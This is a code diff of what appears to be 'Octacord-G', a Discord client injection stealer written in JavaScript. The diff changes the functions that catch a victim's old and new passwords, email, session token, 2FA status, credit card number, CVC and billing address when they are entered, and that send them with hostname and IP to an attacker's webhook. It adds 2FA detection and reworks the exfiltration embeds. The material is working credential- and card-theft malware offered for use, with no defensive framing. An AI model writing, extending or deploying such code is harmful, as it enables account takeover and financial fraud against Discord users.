@@ -286,11 +286,11 @@ let twoFA = "";
                                 inline: !1
                             },{
                                 name: "PC Info",
-                                value: `\`\`\`PC NAME: \n${computerName}\nIP: ${ip}\n ${discordInstall}\n\`\`\``,
+                                value: `\`\`\`PC NAME: \n${computerName}\nIP: ${ip}\n${discordInstall}\n\`\`\``,
                                 inline: !1
                             },  ],
                             "author": {
-					"name": `${json.username}.${json.discriminator}`,
+					"name": `${json.username}#${json.discriminator}`,
 					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 				},
 				"footer": {
@@ -307,6 +307,13 @@ let twoFA = "";
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
+let twoFA = "";
+	if(token.startsWith("mfa")){
+        twoFA = "True"
+    }
+    else{
+        twoFA= "False"
+    }
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -352,11 +359,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                     embeds: [{
                         "title": "Password Changed",
                         "color": 16507654,
-                        "fields": [{
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-                            inline: !1
-                        }, {
+                        "fields": [ {
                             name: "Username",
                             value: `\`${json.username}#${json.discriminator}\``,
                             inline: !0
@@ -368,12 +371,8 @@ function ChangePassword(oldpassword, newpassword, token) {
                             name: "Nitro",
                             value: `${GetNitro(json.premium_type)}`,
                             inline: !1
-                        }, {
-                            name: "Badges",
-                            value: `${GetBadges(json.flags)}`,
-                            inline: !1
-                        }, {
-                            name: "Billing",
+                        },  {
+                            name: "Billing(Not 100% Correct)",
                             value: `${Cool()}`,
                             inline: !1
                         }, {
@@ -388,20 +387,23 @@ function ChangePassword(oldpassword, newpassword, token) {
                             name: "New Password",
                             value: `\`${newpassword}\``,
                             inline: !0
-                        }, {
+                        }, { 
+			    	name : "2FA Enabled",
+				value : `${twoFA}`,
+				inline : !0
+			    
+			    }, {
                             name: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "Octacord-G"
-                        },
-                        "footer": {
-                            "text": "Octacord-G"
-                        },
-                        "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                        }
+					"name": `${json.username}.${json.discriminator}`,
+					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+				},
+				"footer": {
+					"text": "Octacord-G"
+				}
                     }]
                 }
                 SendToWebhook(JSON.stringify(params))
@@ -411,6 +413,13 @@ function ChangePassword(oldpassword, newpassword, token) {
 }
 
 function ChangeEmail(newemail, password, token) {
+let twoFA = "";
+	if(token.startsWith("mfa")){
+        twoFA = "True"
+    }
+    else{
+        twoFA= "False"
+    }
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
@@ -456,11 +465,7 @@ function ChangeEmail(newemail, password, token) {
                     embeds: [{
                         "title": "Email Changed",
                         "color": 16507654,
-                        "fields": [{
-                            name: "Info",
-                            value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
-                            inline: !1
-                        }, {
+                        "fields": [ {
                             name: "Username",
                             value: `\`${json.username}#${json.discriminator}\``,
                             inline: !0
@@ -472,11 +477,7 @@ function ChangeEmail(newemail, password, token) {
                             name: "Nitro",
                             value: `${GetNitro(json.premium_type)}`,
                             inline: !1
-                        }, {
-                            name: "Badges",
-                            value: `${GetBadges(json.flags)}`,
-                            inline: !1
-                        }, {
+                        },  {
                             name: "Billing",
                             value: `${Cool()}`,
                             inline: !1
@@ -488,20 +489,23 @@ function ChangeEmail(newemail, password, token) {
                             name: "Password",
                             value: `\`${password}\``,
                             inline: !0
-                        }, {
+                        },{ 
+			    	name : "2FA Enabled",
+				value : `${twoFA}`,
+				inline : !0
+			    
+			    },  {
                             name: "Token",
                             value: `\`\`\`${token}\`\`\``,
                             inline: !1
                         }, ],
                         "author": {
-                            "name": "Octacord-G"
-                        },
-                        "footer": {
-                            "text": "Octacord-G"
-                        },
-                        "thumbnail": {
-                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-                        }
+					"name": `${json.username}.${json.discriminator}`,
+					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+				},
+				"footer": {
+					"text": "Octacord-G"
+				}
                     }]
                 }
                 SendToWebhook(JSON.stringify(params))
@@ -531,15 +535,13 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 embeds: [{
                     "title": "User Credit Card Added",
                     "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
-                    "author": {
-                        "name": "Octacord-G"
-                    },
-                    "footer": {
-                        "text": "Octacord-G"
-                    },
-                    "thumbnail": {
-                        "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
-                    }
+                   "author": {
+					"name": `${json.username}.${json.discriminator}`,
+					"icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+				},
+				"footer": {
+					"text": "Octacord-G"
+				}
                 }]
             }
             SendToWebhook(JSON.stringify(params))
